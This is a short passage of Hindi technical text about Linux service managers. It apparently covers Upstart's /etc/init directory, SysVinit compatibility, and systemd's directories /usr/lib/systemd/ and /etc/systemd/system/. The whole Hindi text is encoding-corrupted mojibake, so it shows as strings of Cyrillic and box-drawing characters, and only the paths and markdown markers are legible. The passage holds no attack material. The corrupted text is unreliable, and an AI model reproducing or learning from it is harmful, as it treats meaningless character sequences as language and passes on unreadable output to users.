рд╡рд╣реАрдВ, `/etc/init` **рдЕрдкрд╕реНрдЯрд╛рд░реНрдЯ** рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝рд╛ рд╣реИ, рдЬреЛ рдЙрдмреБрдВрдЯреВ рджреНрд╡рд╛рд░рд╛ рдкреЗрд╢ рдХрд┐рдП рдЧрдП рдПрдХ рдирдП **рд╕реЗрд╡рд╛ рдкреНрд░рдмрдВрдзрди** рд╣реИ, рд╕реЗрд╡рд╛ рдкреНрд░рдмрдВрдзрди рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рдЕрдкрд╕реНрдЯрд╛рд░реНрдЯ рдХреА рдУрд░ рд╕реНрдерд╛рдирд╛рдВрддрд░рдг рдХреЗ рдмрд╛рд╡рдЬреВрдж, рдЙрдкрд╕реНрдерд┐рддрд┐ рдореЗрдВ рдПрдХ рд╕рдВрдЧрддрддрд╛ рдкрд░рдд рдХреЗ рдХрд╛рд░рдг рдЕрдкрд╕реНрдЯрд╛рд░реНрдЯ рдХреЗ рд╕рд╛рде рд╕рд┐рд╕рд╡реАрдирд┐рдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рднреА рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред

**рд╕рд┐рд╕реНрдЯрдордбреА** рдПрдХ рдЖрдзреБрдирд┐рдХ рдкреНрд░рд╛рд░рдВрднреАрдХрд░рдг рдФрд░ рд╕реЗрд╡рд╛ рдкреНрд░рдмрдВрдзрдХ рдХреЗ рд░реВрдк рдореЗрдВ рд╕рд╛рдордиреЗ рдЖрддрд╛ рд╣реИ, рдЬреЛ рдЖрд╡рд╢реНрдпрдХрддрд╛рдиреБрд╕рд╛рд░ рдбреЗрдорди рд╢реБрд░реВ рдХрд░рдиреЗ, рдСрдЯреЛрдорд╛рдЙрдВрдЯ рдкреНрд░рдмрдВрдзрди, рдФрд░ рд╕рд┐рд╕реНрдЯрдо рд╕реНрдерд┐рддрд┐ рд╕реНрдиреИрдкрд╢реЙрдЯ рдЬреИрд╕реА рдЙрдиреНрдирдд рд╕реБрд╡рд┐рдзрд╛рдПрдВ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдпрд╣ рд╡рд┐рддрд░рдг рдкреИрдХреЗрдЬреЛрдВ рдХреЗ рд▓рд┐рдП `/usr/lib/systemd/` рдореЗрдВ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╕рдВрдЧрдард┐рдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдкреНрд░рд╢рд╛рд╕рдХ рд╕рдВрд╢реЛрдзрдиреЛрдВ рдХреЗ рд▓рд┐рдП `/etc/systemd/system/` рдореЗрдВ, рд╕рд┐рд╕реНрдЯрдо рдкреНрд░рд╢рд╛рд╕рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕реБрдЧрдо рдмрдирд╛рддрд╛ рд╣реИред
